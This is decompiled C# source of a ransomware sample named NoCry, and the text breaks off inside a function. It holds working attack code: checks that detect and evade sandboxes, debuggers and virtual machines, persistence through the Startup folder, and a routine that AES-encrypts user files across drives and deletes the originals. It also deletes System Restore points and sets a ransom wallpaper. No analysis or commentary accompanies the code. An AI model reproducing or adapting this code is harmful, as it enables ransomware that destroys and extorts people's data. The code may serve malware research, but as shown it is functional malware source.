// Decompiled with JetBrains decompiler
// Type: NoCry.Module1
// Assembly: NoCry, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD7384EC-1348-457C-BEC6-7E1381E8F337
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-67f972536102feb9b3de184c34d9f8b1114c1c38ab3fbb15bb0419043f68a913.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace NoCry
{
  [StandardModule]
  internal sealed class Module1
  {
    private static FileStream fsInput;
    private static FileStream fsOutput;
    private static byte[] bytKey;
    private static byte[] bytIV;
    private static string textbox;
    private const int SETDESKWALLPAPER = 20;
    private const int UPDATEINIFILE = 1;
    public static object protect;
    public static List<string> list = new List<string>();
    public static object MT = (object) null;

    [DllImport("user32", EntryPoint = "SystemParametersInfoA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam,
      int fuWinIni);

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void main()
    {
      int num1;
      int num2;
      try
      {
label_2:
        int num3 = 1;
        bool createdNew = false;
label_3:
        num3 = 2;
        Module1.MT = (object) new Mutex(true, Class1.Settings.mute, out createdNew);
label_4:
        num3 = 3;
        if (!createdNew)
          ProjectData.EndApp();
        else
          goto label_7;
label_6:
label_7:
label_8:
        num3 = 5;
        if (!Class1.Settings.Emulator)
          goto label_14;
label_9:
        num3 = 6;
        if (Anti.Emulator())
          ProjectData.EndApp();
        else
          goto label_12;
label_11:
label_12:
label_13:
label_14:
label_15:
        num3 = 9;
        if (!Class1.Settings.DetectDebugger)
          goto label_21;
label_16:
        num3 = 10;
        if (Anti.DetectDebugger())
          ProjectData.EndApp();
        else
          goto label_19;
label_18:
label_19:
label_20:
label_21:
label_22:
        num3 = 13;
        if (!Class1.Settings.DetectSandboxie)
          goto label_28;
label_23:
        num3 = 14;
        if (Anti.DetectSandboxie())
          ProjectData.EndApp();
        else
          goto label_26;
label_25:
label_26:
label_27:
label_28:
label_29:
        num3 = 17;
        if (!Class1.Settings.DetectVirtualMachine)
          goto label_35;
label_30:
        num3 = 18;
        if (Anti.DetectVirtualMachine())
          ProjectData.EndApp();
        else
          goto label_33;
label_32:
label_33:
label_34:
label_35:
label_36:
        num3 = 21;
        if (!Class1.Settings.anyrun)
          goto label_42;
label_37:
        num3 = 22;
        if (Anti.anyrun())
          ProjectData.EndApp();
        else
          goto label_40;
label_39:
label_40:
label_41:
label_42:
label_43:
        num3 = 25;
        if (!Class1.Settings.startup)
          goto label_46;
label_44:
        num3 = 26;
        Module1.startup(Application.ExecutablePath);
label_45:
label_46:
label_47:
        num3 = 28;
        Class1.Settings.hash = Conversions.ToString(Module1.Bot());
label_48:
        num3 = 29;
        if (Operators.CompareString(Interaction.GetSetting("F", "0", Class1.Settings.Setting), "Done", false) == 0)
          goto label_64;
label_49:
        num3 = 31;
        if (Operators.CompareString(Interaction.GetSetting("F", "0", Class1.Settings.Setting), (string) null, false) != 0)
          goto label_62;
label_50:
        num3 = 32;
        StringBuilder stringBuilder = new StringBuilder();
label_51:
        num3 = 33;
        Random random = new Random();
label_52:
        num3 = 34;
        int maxrandom = Class1.Settings.maxrandom;
        int num4 = 1;
        goto label_57;
label_53:
        num3 = 35;
        int index1 = random.Next(0, Class1.Settings.validchars.Length);
label_54:
        num3 = 36;
        char validchar = Class1.Settings.validchars[index1];
label_55:
        num3 = 37;
        stringBuilder.Append(validchar);
label_56:
        num3 = 38;
        checked { ++num4; }
label_57:
        if (num4 <= maxrandom)
          goto label_53;
label_58:
        num3 = 39;
        string input = stringBuilder.ToString();
label_59:
        num3 = 40;
        Interaction.SaveSetting("F", "0", Class1.Settings.Setting, Conversions.ToString(check.AES_Encrypt(input, Module1.HWID() + Module1.HWID())));
label_60:
        num3 = 41;
        Interaction.SaveSetting("G", "0", Class1.Settings.Setting, Conversions.ToString(check.AES_Encrypt(Class1.Settings.Setting, Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class1.Settings.Setting), Module1.HWID() + Module1.HWID())))));
label_61:
label_62:
label_63:
label_64:
        num3 = 44;
        if (Operators.CompareString(Interaction.GetSetting("C", "0", Class1.Settings.Setting), "Done", false) == 0)
          goto label_160;
label_65:
        ProjectData.ClearProjectError();
        num1 = -2;
label_66:
        num3 = 47;
        Module1.bytKey = Module1.CreateKey(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class1.Settings.Setting), Module1.HWID() + Module1.HWID())));
label_67:
        num3 = 48;
        Module1.bytIV = Module1.CreateIV(Conversions.ToString(check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class1.Settings.Setting), Module1.HWID() + Module1.HWID())));
label_68:
        num3 = 49;
        string[] logicalDrives1 = Environment.GetLogicalDrives();
        int index2 = 0;
        goto label_122;
label_70:
        num3 = 50;
        string str1;
        DriveInfo driveInfo1 = new DriveInfo(str1);
label_71:
        num3 = 51;
        if (Operators.CompareString(driveInfo1.Name, Path.GetPathRoot(Environment.SystemDirectory), false) == 0)
          goto label_121;
label_72:
        num3 = 53;
        string[] directories1 = Directory.GetDirectories(str1);
        int index3 = 0;
        goto label_108;
label_74:
        num3 = 54;
        string ruta1;
        if (ruta1.EndsWith("Bin"))
          goto label_107;
label_75:
        num3 = 56;
        if (ruta1.EndsWith("indows"))
          goto label_106;
label_76:
        num3 = 58;
        if (ruta1.EndsWith("tings"))
          goto label_105;
label_77:
        num3 = 60;
        if (ruta1.EndsWith("System Volume Information"))
          goto label_104;
label_78:
        num3 = 62;
        if (ruta1.EndsWith("cache"))
          goto label_103;
label_79:
        num3 = 64;
        if (ruta1.EndsWith("very"))
          goto label_102;
label_80:
        num3 = 66;
        if (ruta1.EndsWith("rogram Files (x86)"))
          goto label_101;
label_81:
        num3 = 68;
        if (ruta1.EndsWith("rogram Files"))
          goto label_100;
label_82:
        num3 = 70;
        if (ruta1.EndsWith("boot"))
          goto label_99;
label_83:
        num3 = 72;
        if (ruta1.EndsWith("efi"))
          goto label_98;
label_84:
        num3 = 74;
        if (ruta1.EndsWith(".old"))
          goto label_97;
label_85:
        num3 = 76;
        IEnumerator<string> enumerator1 = Module1.outonly(ruta1, Class1.Settings.mExtesiones).GetEnumerator();
        goto label_93;
label_87:
        num3 = 77;
        string current1;
        if (Operators.CompareString(current1, (string) null, false) == 0)
          goto label_92;
label_88:
        num3 = 79;
        if (Module1.list.Contains(current1))
          goto label_91;
label_89:
        num3 = 81;
        Module1.list.Add(current1);
label_90:
label_91:
label_92:
        num3 = 84;
label_93:
        if (enumerator1.MoveNext())
        {
          current1 = enumerator1.Current;
          goto label_87;
        }
label_94:
        num3 = 85;
        enumerator1?.Dispose();
label_96:
label_97:
label_98:
label_99:
label_100:
label_101:
label_102:
label_103:
label_104:
label_105:
label_106:
label_107:
        num3 = 97;
        checked { ++index3; }
label_108:
        if (index3 < directories1.Length)
        {
          ruta1 = directories1[index3];
          goto label_74;
        }
label_109:
        num3 = 98;
        IEnumerator<string> enumerator2 = Module1.inonly(driveInfo1.Name, Class1.Settings.mExtesiones).GetEnumerator();
        goto label_117;
label_111:
        num3 = 99;
        string current2;
        if (Operators.CompareString(current2, (string) null, false) == 0)
          goto label_116;
label_112:
        num3 = 101;
        if (Module1.list.Contains(current2))
          goto label_115;
label_113:
        num3 = 103;
        Module1.list.Add(current2);
label_114:
label_115:
label_116:
        num3 = 106;
label_117:
        if (enumerator2.MoveNext())
        {
          current2 = enumerator2.Current;
          goto label_111;
        }
label_118:
        num3 = 107;
        enumerator2?.Dispose();
label_120:
label_121:
        num3 = 109;
        checked { ++index2; }
label_122:
        if (index2 < logicalDrives1.Length)
        {
          str1 = logicalDrives1[index2];
          goto label_70;
        }
label_123:
        num3 = 110;
        IEnumerator<string> enumerator3 = Module1.inonly(Interaction.Environ("USERPROFILE"), Class1.Settings.mExtesiones).GetEnumerator();
        goto label_131;
label_125:
        num3 = 111;
        string current3;
        if (Operators.CompareString(current3, (string) null, false) == 0)
          goto label_130;
label_126:
        num3 = 113;
        if (Module1.list.Contains(current3))
          goto label_129;
label_127:
        num3 = 115;
        Module1.list.Add(current3);
label_128:
label_129:
label_130:
        num3 = 118;
label_131:
        if (enumerator3.MoveNext())
        {
          current3 = enumerator3.Current;
          goto label_125;
        }
label_132:
        num3 = 119;
        enumerator3?.Dispose();
label_134:
        num3 = 120;
        string[] directories2 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
        int index4 = 0;
        goto label_148;
label_136:
        num3 = 121;
        string ruta2;
        IEnumerator<string> enumerator4 = Module1.outonly(ruta2, Class1.Settings.mExtesiones).GetEnumerator();
        goto label_144;
label_138:
        num3 = 122;
        string current4;
        if (Operators.CompareString(current4, (string) null, false) == 0)
          goto label_143;
label_139:
        num3 = 124;
        if (Module1.list.Contains(current4))
          goto label_142;
label_140:
        num3 = 126;
        Module1.list.Add(current4);
label_141:
label_142:
label_143:
        num3 = 129;
label_144:
        if (enumerator4.MoveNext())
        {
          current4 = enumerator4.Current;
          goto label_138;
        }
label_145:
        num3 = 130;
        enumerator4?.Dispose();
label_147:
        num3 = 131;
        checked { ++index4; }
label_148:
        if (index4 < directories2.Length)
        {
          ruta2 = directories2[index4];
          goto label_136;
        }
label_149:
        num3 = 132;
        List<string>.Enumerator enumerator5 = Module1.list.GetEnumerator();
        goto label_156;
label_151:
        num3 = 133;
        string current5;
        if (!System.IO.File.Exists(current5))
          goto label_154;
label_152:
        num3 = 134;
        Module1.EncryptOrDecryptFile(current5, current5 + Class1.Settings.exs, Module1.bytKey, Module1.bytIV, Module1.CryptoAction.ActionEncrypt);
label_153:
label_154:
label_155:
        num3 = 136;
label_156:
        if (enumerator5.MoveNext())
        {
          current5 = enumerator5.Current;
          goto label_151;
        }
label_157:
        num3 = 137;
        enumerator5.Dispose();
label_158:
        num3 = 138;
        MyProject.Forms.Form1.BackgroundWorker1.RunWorkerAsync();
label_159:
label_160:
        ProjectData.ClearProjectError();
        num1 = -3;
label_161:
        num3 = 141;
        string[] logicalDrives2 = Environment.GetLogicalDrives();
        int index5 = 0;
        goto label_215;
label_163:
        num3 = 142;
        string str2;
        DriveInfo driveInfo2 = new DriveInfo(str2);
label_164:
        num3 = 143;
        if (Operators.CompareString(driveInfo2.Name, Path.GetPathRoot(Environment.SystemDirectory), false) == 0)
          goto label_214;
label_165:
        num3 = 145;
        string[] directories3 = Directory.GetDirectories(str2);
        int index6 = 0;
        goto label_201;
label_167:
        num3 = 146;
        string ruta3;
        if (ruta3.EndsWith("Bin"))
          goto label_200;
label_168:
        num3 = 148;
        if (ruta3.EndsWith("indows"))
          goto label_199;
label_169:
        num3 = 150;
        if (ruta3.EndsWith("tings"))
          goto label_198;
label_170:
        num3 = 152;
        if (ruta3.EndsWith("System Volume Information"))
          goto label_197;
label_171:
        num3 = 154;
        if (ruta3.EndsWith("cache"))
          goto label_196;
label_172:
        num3 = 156;
        if (ruta3.EndsWith("very"))
          goto label_195;
label_173:
        num3 = 158;
        if (ruta3.EndsWith("rogram Files (x86)"))
          goto label_194;
label_174:
        num3 = 160;
        if (ruta3.EndsWith("rogram Files"))
          goto label_193;
label_175:
        num3 = 162;
        if (ruta3.EndsWith("boot"))
          goto label_192;
label_176:
        num3 = 164;
        if (ruta3.EndsWith("efi"))
          goto label_191;
label_177:
        num3 = 166;
        if (ruta3.EndsWith(".old"))
          goto label_190;
label_178:
        num3 = 168;
        IEnumerator enumerator6 = ((IEnumerable) Module1.enc1(ruta3)).GetEnumerator();
        goto label_186;
label_180:
        num3 = 169;
        string Left1;
        if (Operators.CompareString(Left1, (string) null, false) == 0)
          goto label_185;
label_181:
        num3 = 171;
        if (Form4.listenc.Contains(Left1))
          goto label_184;
label_182:
        num3 = 173;
        Form4.listenc.Add(Left1);
label_183:
label_184:
label_185:
        num3 = 176;
label_186:
        if (enumerator6.MoveNext())
        {
          Left1 = Conversions.ToString(enumerator6.Current);
          goto label_180;
        }
label_187:
        num3 = 177;
        if (enumerator6 is IDisposable)
          (enumerator6 as IDisposable).Dispose();
label_189:
label_190:
label_191:
label_192:
label_193:
label_194:
label_195:
label_196:
label_197:
label_198:
label_199:
label_200:
        num3 = 189;
        checked { ++index6; }
label_201:
        if (index6 < directories3.Length)
        {
          ruta3 = directories3[index6];
          goto label_167;
        }
label_202:
        num3 = 190;
        IEnumerator enumerator7 = ((IEnumerable) Module1.enc2(driveInfo2.Name)).GetEnumerator();
        goto label_210;
label_204:
        num3 = 191;
        string Left2;
        if (Operators.CompareString(Left2, (string) null, false) == 0)
          goto label_209;
label_205:
        num3 = 193;
        if (Form4.listenc.Contains(Left2))
          goto label_208;
label_206:
        num3 = 195;
        Form4.listenc.Add(Left2);
label_207:
label_208:
label_209:
        num3 = 198;
label_210:
        if (enumerator7.MoveNext())
        {
          Left2 = Conversions.ToString(enumerator7.Current);
          goto label_204;
        }
label_211:
        num3 = 199;
        if (enumerator7 is IDisposable)
          (enumerator7 as IDisposable).Dispose();
label_213:
label_214:
        num3 = 201;
        checked { ++index5; }
label_215:
        if (index5 < logicalDrives2.Length)
        {
          str2 = logicalDrives2[index5];
          goto label_163;
        }
label_216:
        num3 = 202;
        IEnumerator enumerator8 = ((IEnumerable) Module1.enc2(Interaction.Environ("USERPROFILE"))).GetEnumerator();
        goto label_224;
label_218:
        num3 = 203;
        string Left3;
        if (Operators.CompareString(Left3, (string) null, false) == 0)
          goto label_223;
label_219:
        num3 = 205;
        if (Form4.listenc.Contains(Left3))
          goto label_222;
label_220:
        num3 = 207;
        Form4.listenc.Add(Left3);
label_221:
label_222:
label_223:
        num3 = 210;
label_224:
        if (enumerator8.MoveNext())
        {
          Left3 = Conversions.ToString(enumerator8.Current);
          goto label_218;
        }
label_225:
        num3 = 211;
        if (enumerator8 is IDisposable)
          (enumerator8 as IDisposable).Dispose();
label_227:
        num3 = 212;
        string[] directories4 = Directory.GetDirectories(Interaction.Environ("USERPROFILE"));
        int index7 = 0;
        goto label_241;
label_229:
        num3 = 213;
        string ruta4;
        IEnumerator enumerator9 = ((IEnumerable) Module1.enc1(ruta4)).GetEnumerator();
        goto label_237;
label_231:
        num3 = 214;
        string Left4;
        if (Operators.CompareString(Left4, (string) null, false) == 0)
          goto label_236;
label_232:
        num3 = 216;
        if (Form4.listenc.Contains(Left4))
          goto label_235;
label_233:
        num3 = 218;
        Form4.listenc.Add(Left4);
label_234:
label_235:
label_236:
        num3 = 221;
label_237:
        if (enumerator9.MoveNext())
        {
          Left4 = Conversions.ToString(enumerator9.Current);
          goto label_231;
        }
label_238:
        num3 = 222;
        if (enumerator9 is IDisposable)
          (enumerator9 as IDisposable).Dispose();
label_240:
        num3 = 223;
        checked { ++index7; }
label_241:
        if (index7 < directories4.Length)
        {
          ruta4 = directories4[index7];
          goto label_229;
        }
label_242:
        num3 = 224;
        if (!Operators.ConditionalCompareObjectEqual(Class1.Settings.Del, (object) "OK", false))
          goto label_245;
label_243:
        num3 = 225;
        del.del();
label_244:
label_245:
label_246:
        num3 = 227;
        if (!Class1.Settings.DeleteRestorePoints)
          goto label_249;
label_247:
        num3 = 228;
        Module1.DeleteRestorePoints();
label_248:
label_249:
label_250:
        num3 = 230;
        string lpvParam = Path.GetTempPath() + "Cry.img";
label_251:
        num3 = 231;
        if (System.IO.File.Exists(lpvParam))
          goto label_254;
label_252:
        num3 = 233;
        NoCry.My.Resources.Resources.background.Save(lpvParam, ImageFormat.Bmp);
label_253:
label_254:
        num3 = 235;
        Module1.SystemParametersInfo(20, 0, ref lpvParam, 1);
label_255:
        num3 = 236;
        int num5 = (int) MyProject.Forms.Form1.ShowDialog();
        goto label_262;
label_257:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num6 = num2 + 1;
            num2 = 0;
            switch (num6)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_6;
              case 5:
                goto label_8;
              case 6:
                goto label_9;
              case 7:
                goto label_11;
              case 8:
                goto label_13;
              case 9:
                goto label_15;
              case 10:
                goto label_16;
              case 11:
                goto label_18;
              case 12:
                goto label_20;
              case 13:
                goto label_22;
              case 14:
                goto label_23;
              case 15:
                goto label_25;
              case 16:
                goto label_27;
              case 17:
                goto label_29;
              case 18:
                goto label_30;
              case 19:
                goto label_32;
              case 20:
                goto label_34;
              case 21:
                goto label_36;
              case 22:
                goto label_37;
              case 23:
                goto label_39;
              case 24:
                goto label_41;
              case 25:
                goto label_43;
              case 26:
                goto label_44;
              case 27:
                goto label_45;
              case 28:
                goto label_47;
              case 29:
                goto label_48;
              case 30:
              case 44:
                goto label_64;
              case 31:
                goto label_49;
              case 32:
                goto label_50;
              case 33:
                goto label_51;
              case 34:
                goto label_52;
              case 35:
                goto label_53;
              case 36:
                goto label_54;
              case 37:
                goto label_55;
              case 38:
                goto label_56;
              case 39:
                goto label_58;
              case 40:
                goto label_59;
              case 41:
                goto label_60;
              case 42:
                goto label_61;
              case 43:
                goto label_63;
              case 45:
              case 140:
                goto label_160;
              case 46:
                goto label_65;
              case 47:
                goto label_66;
              case 48:
                goto label_67;
              case 49:
                goto label_68;
              case 50:
                goto label_70;
              case 51:
                goto label_71;
              case 52:
              case 109:
                goto label_121;
              case 53:
                goto label_72;
              case 54:
                goto label_74;
              case 55:
              case 97:
                goto label_107;
              case 56:
                goto label_75;
              case 57:
              case 96:
                goto label_106;
              case 58:
                goto label_76;
              case 59:
              case 95:
                goto label_105;
              case 60:
                goto label_77;
              case 61:
              case 94:
                goto label_104;
              case 62:
                goto label_78;
              case 63:
              case 93:
                goto label_103;
              case 64:
                goto label_79;
              case 65:
              case 92:
                goto label_102;
              case 66:
                goto label_80;
              case 67:
              case 91:
                goto label_101;
              case 68:
                goto label_81;
              case 69:
              case 90:
                goto label_100;
              case 70:
                goto label_82;
              case 71:
              case 89:
                goto label_99;
              case 72:
                goto label_83;
              case 73:
              case 88:
                goto label_98;
              case 74:
                goto label_84;
              case 75:
              case 87:
                goto label_97;
              case 76:
                goto label_85;
              case 77:
                goto label_87;
              case 78:
              case 84:
                goto label_92;
              case 79:
                goto label_88;
              case 80:
              case 83:
                goto label_91;
              case 81:
                goto label_89;
              case 82:
                goto label_90;
              case 85:
                goto label_94;
              case 86:
                goto label_96;
              case 98:
                goto label_109;
              case 99:
                goto label_111;
              case 100:
              case 106:
                goto label_116;
              case 101:
                goto label_112;
              case 102:
              case 105:
                goto label_115;
              case 103:
                goto label_113;
              case 104:
                goto label_114;
              case 107:
                goto label_118;
              case 108:
                goto label_120;
              case 110:
                goto label_123;
              case 111:
                goto label_125;
              case 112:
              case 118:
                goto label_130;
              case 113:
                goto label_126;
              case 114:
              case 117:
                goto label_129;
              case 115:
                goto label_127;
              case 116:
                goto label_128;
              case 119:
                goto label_132;
              case 120:
                goto label_134;
              case 121:
                goto label_136;
              case 122:
                goto label_138;
              case 123:
              case 129:
                goto label_143;
              case 124:
                goto label_139;
              case 125:
              case 128:
                goto label_142;
              case 126:
                goto label_140;
              case (int) sbyte.MaxValue:
                goto label_141;
              case 130:
                goto label_145;
              case 131:
                goto label_147;
              case 132:
                goto label_149;
              case 133:
                goto label_151;
              case 134:
                goto label_152;
              case 135:
                goto label_153;
              case 136:
                goto label_155;
              case 137:
                goto label_157;
              case 138:
                goto label_158;
              case 139:
                goto label_159;
              case 141:
                goto label_161;
              case 142:
                goto label_163;
              case 143:
                goto label_164;
              case 144:
              case 201:
                goto label_214;
              case 145:
                goto label_165;
              case 146:
                goto label_167;
              case 147:
              case 189:
                goto label_200;
              case 148:
                goto label_168;
              case 149:
              case 188:
                goto label_199;
              case 150:
                goto label_169;
              case 151:
              case 187:
                goto label_198;
              case 152:
                goto label_170;
              case 153:
              case 186:
                goto label_197;
              case 154:
                goto label_171;
              case 155:
              case 185:
                goto label_196;
              case 156:
                goto label_172;
              case 157:
              case 184:
                goto label_195;
              case 158:
                goto label_173;
              case 159:
              case 183:
                goto label_194;
              case 160:
                goto label_174;
              case 161:
              case 182:
                goto label_193;
              case 162:
                goto label_175;
              case 163:
              case 181:
                goto label_192;
              case 164:
                goto label_176;
              case 165:
              case 180:
                goto label_191;
              case 166:
                goto label_177;
              case 167:
              case 179:
                goto label_190;
              case 168:
                goto label_178;
              case 169:
                goto label_180;
              case 170:
              case 176:
                goto label_185;
              case 171:
                goto label_181;
              case 172:
              case 175:
                goto label_184;
              case 173:
                goto label_182;
              case 174:
                goto label_183;
              case 177:
                goto label_187;
              case 178:
                goto label_189;
              case 190:
                goto label_202;
              case 191:
                goto label_204;
              case 192:
              case 198:
                goto label_209;
              case 193:
                goto label_205;
              case 194:
              case 197:
                goto label_208;
              case 195:
                goto label_206;
              case 196:
                goto label_207;
              case 199:
                goto label_211;
              case 200:
                goto label_213;
              case 202:
                goto label_216;
              case 203:
                goto label_218;
              case 204:
              case 210:
                goto label_223;
              case 205:
                goto label_219;
              case 206:
              case 209:
                goto label_222;
              case 207:
                goto label_220;
              case 208:
                goto label_221;
              case 211:
                goto label_225;
              case 212:
                goto label_227;
              case 213:
                goto label_229;
              case 214:
                goto label_231;
              case 215:
              case 221:
                goto label_236;
              case 216:
                goto label_232;
              case 217:
              case 220:
                goto label_235;
              case 218:
                goto label_233;
              case 219:
                goto label_234;
              case 222:
                goto label_238;
              case 223:
                goto label_240;
              case 224:
                goto label_242;
              case 225:
                goto label_243;
              case 226:
                goto label_244;
              case 227:
                goto label_246;
              case 228:
                goto label_247;
              case 229:
                goto label_248;
              case 230:
                goto label_250;
              case 231:
                goto label_251;
              case 232:
              case 235:
                goto label_254;
              case 233:
                goto label_252;
              case 234:
                goto label_253;
              case 236:
                goto label_255;
              case 237:
                goto label_262;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_257;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_262:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static IEnumerable<string> outonly(
      string ruta,
      IEnumerable<string> mExtesiones)
    {
      return (IEnumerable<string>) ((IEnumerable<string>) Directory.GetFiles(ruta, "*", SearchOption.AllDirectories)).Where<string>((Func<string, bool>) (ifilesinfo => mExtesiones.Contains<string>(Path.GetExtension(ifilesinfo).ToLower()))).ToList<string>();
    }

    public static IEnumerable<string> inonly(
      string ruta,
      IEnumerable<string> mExtesiones)
    {
      return (IEnumerable<string>) ((IEnumerable<string>) Directory.GetFiles(ruta, "*")).Where<string>((Func<string, bool>) (ifilesinfo => mExtesiones.Contains<string>(Path.GetExtension(ifilesinfo).ToLower()))).ToList<string>();
    }

    public static object enc1(string ruta)
    {
      string[] files = Directory.GetFiles(ruta, "*" + Class1.Settings.exs, SearchOption.AllDirectories);
      Func<string, string> selector;
      // ISSUE: reference to a compiler-generated field
      if (Module1._Closure\u0024__.\u0024I14\u002D0 != null)
      {
        // ISSUE: reference to a compiler-generated field
        selector = Module1._Closure\u0024__.\u0024I14\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        Module1._Closure\u0024__.\u0024I14\u002D0 = selector = (Func<string, string>) (ifilesinfo => ifilesinfo);
      }
      return (object) ((IEnumerable<string>) files).Select<string, string>(selector);
    }

    public static object enc2(string ruta)
    {
      string[] files = Directory.GetFiles(ruta, "*" + Class1.Settings.exs);
      Func<string, string> selector;
      // ISSUE: reference to a compiler-generated field
      if (Module1._Closure\u0024__.\u0024I15\u002D0 != null)
      {
        // ISSUE: reference to a compiler-generated field
        selector = Module1._Closure\u0024__.\u0024I15\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        Module1._Closure\u0024__.\u0024I15\u002D0 = selector = (Func<string, string>) (ifilesinfo => ifilesinfo);
      }
      return (object) ((IEnumerable<string>) files).Select<string, string>(selector);
    }

    private static void EncryptOrDecryptFile(
      string strInputFile,
      string strOutputFile,
      byte[] bytKey,
      byte[] bytIV,
      Module1.CryptoAction Direction)
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        Module1.fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
label_4:
        num3 = 3;
        Module1.fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
label_5:
        num3 = 4;
        Module1.fsOutput.SetLength(0L);
label_6:
        num3 = 5;
        byte[] numArray = new byte[4097];
label_7:
        num3 = 6;
        long num4 = 0;
label_8:
        num3 = 7;
        long length = Module1.fsInput.Length;
label_9:
        num3 = 8;
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
label_10:
        num3 = 9;
        if (Direction != Module1.CryptoAction.ActionEncrypt)
          goto label_12;
label_11:
        num3 = 11;
        CryptoStream cryptoStream = new CryptoStream((Stream) Module1.fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
label_12:
        goto label_17;
label_13:
        num3 = 15;
        int count = Module1.fsInput.Read(numArray, 0, 4096);
label_14:
        num3 = 16;
        cryptoStream.Write(numArray, 0, count);
label_15:
        num3 = 17;
        checked { num4 += (long) count; }
label_16:
label_17:
        num3 = 14;
        if (num4 < length)
          goto label_13;
label_18:
        num3 = 19;
        cryptoStream.Close();
label_19:
        num3 = 20;
        Module1.fsInput.Close();
label_20:
        num3 = 21;
        Module1.fsOutput.Close();
label_21:
        num3 = 22;
        if (Direction != Module1.CryptoAction.ActionEncrypt)
          goto label_25;
label_22:
        num3 = 23;
        FileInfo fileInfo = new FileInfo(strInputFile);
label_23:
        num3 = 24;
        fileInfo.Delete();
label_24:
label_25:
        goto label_32;
label_27:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_7;
              case 7:
                goto label_8;
              case 8:
                goto label_9;
              case 9:
                goto label_10;
              case 10:
              case 12:
                goto label_12;
              case 11:
                goto label_11;
              case 13:
              case 14:
                goto label_17;
              case 15:
                goto label_13;
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_32;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_27;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_32:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private static byte[] CreateKey(string strPassword)
    {
      char[] charArray = strPassword.ToCharArray();
      byte[] buffer = new byte[checked (charArray.GetUpperBound(0) + 1)];
      int upperBound = charArray.GetUpperBound(0);
      int index1 = 0;
      while (index1 <= upperBound)
      {
        buffer[index1] = checked ((byte) Microsoft.VisualBasic.Strings.Asc(charArray[index1]));
        checked { ++index1; }
      }
      byte[] hash = new SHA512Managed().ComputeHash(buffer);
      byte[] key = new byte[32];
      int index2 = 0;
      do
      {
        key[index2] = hash[index2];
        checked { ++index2; }
      }
      while (index2 <= 31);
      return key;
    }

    private static byte[] CreateIV(string strPassword)
    {
      char[] charArray = strPassword.ToCharArray();
      byte[] buffer = new byte[checked (charArray.GetUpperBound(0) + 1)];
      int upperBound = charArray.GetUpperBound(0);
      int index1 = 0;
      while (index1 <= upperBound)
      {
        buffer[index1] = checked ((byte) Microsoft.VisualBasic.Strings.Asc(charArray[index1]));
        checked { ++index1; }
      }
      byte[] hash = new SHA512Managed().ComputeHash(buffer);
      byte[] iv = new byte[16];
      int index2 = 32;
      do
      {
        iv[checked (index2 - 32)] = hash[index2];
        checked { ++index2; }
      }
      while (index2 <= 47);
      return iv;
    }

    public static object startup(string filename)
    {
      try
      {
        string str = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class1.Settings.mute + ".exe";
        if (System.IO.File.Exists(str))
        {
          Module1.protect = (object) new FileStream(str, FileMode.Open);
        }
        else
        {
          System.IO.File.Copy(filename, str);
          Module1.protect = (object) new FileStream(str, FileMode.Open);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }

    [DllImport("Srclient.dll")]
    public static extern int SRRemoveRestorePoint(int index);

    private static void DeleteRestorePoints()
    {
      try
      {
        ManagementObjectCollection instances = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()).GetInstances();
        try
        {
          foreach (ManagementBaseObject managementBaseObject in instances)
            Module1.SRRemoveRestorePoint(Conversions.ToInteger(Conversions.ToUInteger(managementBaseObject["sequencenumber"]).ToString()));
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static object Bot()
    {
      object obj;
      try
      {
